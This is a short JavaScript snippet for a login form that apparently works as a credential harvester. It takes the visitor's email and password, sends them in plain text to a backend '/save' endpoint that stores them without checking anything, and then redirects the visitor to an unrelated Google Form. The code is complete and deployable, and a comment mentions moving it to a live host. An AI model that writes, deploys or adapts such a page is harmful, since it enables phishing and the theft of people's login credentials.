document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault(); // Prevent default form submission behavior

  const email = e.target.email.value;
  const password = e.target.password.value;

  // Basic validation to ensure fields are not empty
  if (!email || !password) {
    alert('Please enter both email and password');
    return;
  }

  try {
    // Send POST request to backend
    const response = await fetch('http://localhost:3000/save', {  // Change to the live URL if using Render
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });

    // Check if the response was successful
    if (response.ok) {
      // If successful, redirect to Google Form
      window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSfpvZehk-ws2UbDevpf_Wf33zwDELdtDsHT51JA8bBcuUFfwA/viewform?usp=dialog'; // Replace with actual Google Form URL
    } else {
      alert('Failed to save data. Please try again.');
    }
  } catch (error) {
    console.error('Error:', error);  // Log the error for debugging
    alert('Failed to submit data: ' + error.message);
  }
});
